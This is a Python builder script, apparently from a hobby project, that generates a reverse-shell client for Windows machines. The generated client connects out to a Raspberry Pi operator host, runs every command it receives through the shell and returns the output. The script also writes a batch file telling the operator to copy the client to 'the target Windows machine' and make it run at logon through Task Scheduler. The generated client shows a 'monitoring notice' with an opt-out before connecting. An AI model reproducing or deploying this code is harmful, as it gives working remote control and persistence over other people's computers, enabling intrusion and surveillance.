import os
import sys
import socket

def detect_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return None

def main():
    print("=" * 52)
    print("  Pi Reverse Shell - Client Builder")
    print("  Run this on the Raspberry Pi")
    print("=" * 52)
    print()

    detected_ip = detect_local_ip()
    if detected_ip:
        print(f"[*] Detected this Pi's IP: {detected_ip}")
        host_input = input(f"Enter the Pi's IP or Twingate hostname [default: {detected_ip}]: ").strip()
        host = host_input if host_input else detected_ip
    else:
        host = input("Enter the Pi's IP or Twingate hostname: ").strip()

    if not host:
        print("[!] Error: host cannot be empty.")
        sys.exit(1)

    port_input = input("Enter the port [default: 6000]: ").strip()
    port = 6000
    if port_input:
        try:
            port = int(port_input)
            if not (1 <= port <= 65535):
                raise ValueError
        except ValueError:
            print("[!] Invalid port. Using 6000.")
            port = 6000

    script_name = input("Enter the output script name (without extension) [default: client]: ").strip() or "client"
    monitor_label = input("Enter the monitor label shown to the user (e.g. 'your school' or 'HomeNet'): ").strip() or "the system administrator"

    print()

    output_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "output")
    os.makedirs(output_dir, exist_ok=True)

    client_code = f'''import socket
import subprocess
import os
import sys
import time

PI_HOST = "{host}"
PI_PORT = {port}
MONITOR_LABEL = "{monitor_label}"

RED   = "\\033[91m"
RESET = "\\033[0m"
BOLD  = "\\033[1m"

def show_notice():
    os.system("cls" if os.name == "nt" else "clear")
    print(RED + BOLD + "=" * 60 + RESET)
    print(RED + BOLD + "  MONITORING NOTICE" + RESET)
    print(RED + BOLD + "=" * 60 + RESET)
    print()
    print(RED + f"  This device is being monitored by {{MONITOR_LABEL}}." + RESET)
    print(RED +  "  Activity on this device may be recorded and reviewed." + RESET)
    print()
    print(      "  If you DO NOT wish to be monitored, type  delete  and")
    print(      "  press Enter to stop this program.")
    print()
    print(RED + BOLD + "=" * 60 + RESET)
    print()
    try:
        answer = input("  Press Enter to continue, or type 'delete' to opt out: ").strip().lower()
    except (KeyboardInterrupt, EOFError):
        answer = ""
    if answer == "delete":
        print()
        print("  Monitoring stopped. You may close this window.")
        sys.exit(0)

cwd = os.getcwd()

def connect_to_pi():
    global cwd
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((PI_HOST, PI_PORT))

            while True:
                data = client.recv(4096)
                if not data:
                    break
                cmd = data.decode().strip()

                if cmd.lower().startswith("cd"):
                    path = cmd[3:].strip()
                    if not path:
                        cwd = os.path.expanduser("~")
                    else:
                        new_path = os.path.abspath(os.path.join(cwd, path))
                        if os.path.isdir(new_path):
                            cwd = new_path
                            client.sendall(f"{{cwd}}> \\n".encode())
                            continue
                        else:
                            client.sendall(b"The system cannot find the path specified.\\n")
                            continue

                if cmd.lower() == "cls":
                    client.sendall(b"\\x1b[2J\\x1b[H")
                    continue

                try:
                    result = subprocess.run(cmd, shell=True, cwd=cwd, capture_output=True, text=True)
                    output = result.stdout + result.stderr
                    if not output.strip():
                        output = "\\n"
                except Exception as e:
                    output = f"Error: {{e}}\\n"

                client.sendall(output.encode())
        except:
            time.sleep(2)

if __name__ == "__main__":
    show_notice()
    connect_to_pi()
'''

    py_path = os.path.join(output_dir, script_name + ".py")
    with open(py_path, "w") as f:
        f.write(client_code)

    print(f"[+] {script_name}.py created in output/")

    # Write setup_info.bat
    bat_content = f"""@echo off
color 0A
echo ============================================================
echo   Pi Reverse Shell ^| Setup Information
echo ============================================================
echo.
echo   Pi Host     :  {host}
echo   Port        :  {port}
echo   Script Name :  {script_name}.py
echo   Monitor Label: {monitor_label}
echo.
echo ============================================================
echo   STEP 1 ^| RASPBERRY PI
echo ============================================================
echo.
echo   1. Transfer server.py to your Raspberry Pi.
echo   2. On the Pi, run:
echo.
echo        python server.py
echo.
echo   3. The server will wait on port {port} for the client.
echo.
echo ============================================================
echo   STEP 2 ^| WINDOWS CLIENT
echo ============================================================
echo.
echo   1. Copy {script_name}.py to the target Windows machine.
echo   2. Run it with:  python {script_name}.py
echo   3. The user will see a red monitoring notice and can opt out.
echo   4. To run automatically on login, add it to Task Scheduler:
echo.
echo        - Open Task Scheduler
echo        - Action: Create Task
echo        - Triggers tab: New ^> At log on
echo        - Actions tab: Start a program ^> python {script_name}.py
echo.
echo ============================================================
echo   STEP 3 ^| TWINGATE (REMOTE ACCESS OVER INTERNET)
echo ============================================================
echo.
echo   1. Install the Twingate client on your Raspberry Pi.
echo   2. Add the Pi as a Resource in your Twingate Admin Console.
echo   3. The Resource IP/hostname is what you set as PI_HOST.
echo   4. Connect Twingate on your operator machine before running
echo      server.py when accessing the Pi remotely.
echo.
echo ============================================================
echo.
pause
"""

    bat_path = os.path.join(output_dir, "setup_info.bat")
    with open(bat_path, "w") as f:
        f.write(bat_content)

    print(f"[+] setup_info.bat created.")
    print()
    print("  Output files:")
    print(f"    output/{script_name}.py    — deploy to the Windows machine")
    print(f"    output/setup_info.bat     — run for full setup instructions")
    print()
    print("  Don't forget to also run build_server.py to generate server.py for the Pi.")
    print()

if __name__ == "__main__":
    main()
